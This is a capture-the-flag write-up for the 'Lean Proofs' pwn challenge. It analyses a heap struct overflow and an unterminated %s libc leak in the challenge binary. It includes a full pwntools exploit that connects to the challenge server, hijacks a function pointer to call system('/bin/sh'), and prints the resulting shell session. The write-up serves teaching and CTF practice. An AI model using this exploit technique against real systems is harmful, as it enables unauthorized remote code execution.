# Lean Proofs — pwn (50 pts)

**CTF:** CyberBlitz 2026 (organised by SIT)
**Category:** pwn
**Points:** 50
**Flag:** `CYBLTZ2026{2b0c52a2c9d9136c46de9217e44b4633928b8cf9}`

> formalized entirely in Lean, and its newer fork, Yung Lean.

Files given: `proof`, `proof.c`, `libc.so.6`, `ld-linux-x86-64.so.2`.

## TL;DR

A heap struct has a `char lemma[0x200]` buffer that gets read into with a
size covering the *whole struct* (0x218 bytes), so it overflows into two
adjacent fields and a function pointer sitting right after it. That same
function pointer field happens to double as the format-string argument for
a `%s`, giving a free libc leak with no separate infoleak bug, and it's
later `call`ed with the struct's own buffer as its argument — so
overwriting it with `system()` and seeding the buffer with `/bin/sh`
pops a shell.

## The binary

```c
int (*proofs[4])(const char*) = {
  proof_by_intimidation,
  proof_by_confusion,
  proof_by_invigilation,
  puts
};

struct vtable {
  char lemma[0x200];
  unsigned long long left_operand;
  unsigned long long right_operand;
  int (*proof)(const char*);
};
```

Each loop of `main()`:

1. `malloc(sizeof(struct vtable))` → **0x218 bytes**.
2. Reads 8 bytes into `left_operand` (offset `0x200`).
3. Reads 8 bytes into `right_operand` (offset `0x208`).
4. Reads a digit `1`–`4`, sets `proof = proofs[digit - 1]` (offset `0x210`).
5. **`read(0, a->lemma, sizeof(*a))`** — reads up to **0x218 bytes** into a
   buffer that is only `0x200` bytes long. This walks straight through
   `left_operand`, `right_operand`, and `proof` in one shot.
6. `printf("YOUR LEMMA: %s\n", a->lemma)` — no bound on how far `%s` reads;
   it just goes until it hits a NUL byte.
7. `a->proof(a->lemma)` — calls the function pointer **with the struct's
   own buffer as the argument**.
8. `free(a)`, loop back to step 1.

Confirmed the struct layout against the disassembly (no padding, exactly
matches the source):

```
mov edi, 0x218
call malloc           ; sizeof(struct) == 0x218

...
mov QWORD PTR [rax+0x210], rdx   ; proof write, offset 0x210
...
mov edx, 0x218
call read                        ; lemma read, full struct size
...
call rdx                         ; a->proof(a->lemma) — rdi = a (== lemma)
```

And the relocations confirm `proofs[3]` is `puts`, resolved via an
`R_X86_64_64` relocation applied by the dynamic linker **before `main()`
runs** — not lazily via the PLT:

```
000000004098  R_X86_64_64  puts@GLIBC_2.2.5 + 0
```

That matters: it means `proofs[3]` already holds puts's *real runtime
address in libc* the moment the process starts, with zero extra work.

## Bug #1 — struct overflow → controllable function pointer

`read(0, a->lemma, sizeof(*a))` reads `0x218` bytes into the `0x200`-byte
`lemma` array. The extra `0x18` bytes land exactly on
`left_operand` → `right_operand` → `proof`, in that order. So a single
overflowing `lemma` write gives full control of the function pointer
that's about to get called.

## Bug #2 — unterminated `%s` leaks past the buffer

`printf("YOUR LEMMA: %s\n", a->lemma)` has no length limit. If `lemma`
is filled with exactly `0x200` non-NUL bytes (no overflow this time),
`%s` doesn't stop at the end of the buffer — it keeps reading into
whatever is adjacent in memory: `left_operand`, `right_operand`, then
`proof`, stopping at the first `\x00` byte it finds.

## Combining them: leak, then hijack

**Stage 1 — leak libc:**
- Send non-NUL fillers for `left_operand` / `right_operand` (so `%s`
  doesn't stop early there).
- Select proof method `4` → `proof = proofs[3] = &puts` (real libc
  address, already resolved).
- Send exactly `0x200` bytes of filler for `lemma` — **no overflow**, so
  `proof` is left untouched as `&puts`.
- The `%s` over-read spills the raw bytes of the `proof` pointer
  (6 non-zero bytes before the pointer's leading `\x00\x00`) straight
  into the output → `puts` address → libc base.

**Stage 2 — hijack control flow:**
- Next loop iteration, overflow `lemma` for real:
  `"/bin/sh\x00"` + padding to `0x200`, then junk for
  `left_operand`/`right_operand`, then `system_addr` for `proof`.
- `a->proof(a->lemma)` becomes `system("/bin/sh")` — since `proof`'s
  signature `int(*)(const char*)` matches `system`'s exactly, and it's
  always called with the struct's own buffer (which we seeded with
  `/bin/sh`) as the argument.

No canary (irrelevant, it's a heap bug) and PIE on the binary doesn't
matter either, since we never need the binary's own base — only libc's,
which we get for free from `proofs[3]`.

## Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./proof_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("45.77.247.35", 22002)
    return r


def main():
    r = conn()

    # struct vtable {
    #   char lemma[0x200];                  // 0x000
    #   unsigned long long left_operand;    // 0x200
    #   unsigned long long right_operand;   // 0x208
    #   int (*proof)(const char*);          // 0x210
    # };                                    // sizeof == 0x218

    # ---------- stage 1: leak libc via proofs[3] == &puts ----------
    r.recvuntil(b"specify left operand > ")
    r.send(b"A" * 8)
    r.recvuntil(b"specify right operand > ")
    r.send(b"B" * 8)
    r.recvuntil(b"specify proof method > ")
    r.sendline(b"4")                        # proofs[3] == puts (relocated at load time)
    r.recvuntil(b"enter your lemma > ")
    r.send(b"C" * 0x200)                    # fill lemma only - no overflow this time

    r.recvuntil(b"YOUR LEMMA: ")
    r.recvn(0x200 + 8 + 8)                  # skip our own filler bytes
    leak = r.recvuntil(b"\n", drop=True)    # raw proof-pointer bytes, up to its null byte
    puts_addr = u64(leak.ljust(8, b"\x00"))
    libc.address = puts_addr - libc.symbols["puts"]
    log.success(f"puts() @ {hex(puts_addr)}")
    log.success(f"libc base = {hex(libc.address)}")

    r.recvuntil(b"press any key to formally prove your theorem... > ")
    r.send(b"\n")                           # getchar() -> fires proofs[3](lemma) -> puts(lemma)

    # ---------- stage 2: overwrite proof -> system(), lemma = "/bin/sh" ----------
    r.recvuntil(b"specify left operand > ")
    r.send(b"D" * 8)
    r.recvuntil(b"specify right operand > ")
    r.send(b"E" * 8)
    r.recvuntil(b"specify proof method > ")
    r.sendline(b"1")                        # doesn't matter, gets clobbered below

    payload  = b"/bin/sh\x00".ljust(0x200, b"A")
    payload += p64(0)                       # left_operand  (don't care)
    payload += p64(0)                       # right_operand (don't care)
    payload += p64(libc.symbols["system"])  # overwrite proof -> system()
    assert len(payload) == 0x218

    r.recvuntil(b"enter your lemma > ")
    r.send(payload)

    r.recvuntil(b"press any key to formally prove your theorem... > ")
    r.send(b"\n")                           # -> system("/bin/sh")

    r.interactive()


if __name__ == "__main__":
    main()
```

## Run

```
$ python3 solve.py
[+] Opening connection to 45.77.247.35 on port 22002: Done
[+] puts() @ 0x7eff67995be0
[+] libc base = 0x7eff6790e000
[*] Switching to interactive mode
$ cat flag*
CYBLTZ2026{2b0c52a2c9d9136c46de9217e44b4633928b8cf9}
```

## Takeaways

- `sizeof(struct)` reads into a sub-member of that struct are a classic
  smell — check whether the read size covers more than the destination
  field.
- An unterminated `%s` next to attacker-controlled adjacent memory is a
  free infoleak, no format-string `%n`/width tricks needed.
- A global array of function pointers that includes an *external* libc
  symbol (not one defined in the binary) is itself an infoleak: data
  relocations like `R_X86_64_64`/`R_X86_64_GLOB_DAT` for function
  pointers are resolved eagerly at load time, unlike lazily-bound PLT
  stubs — so the pointer is a real, valid libc address the instant the
  process starts.
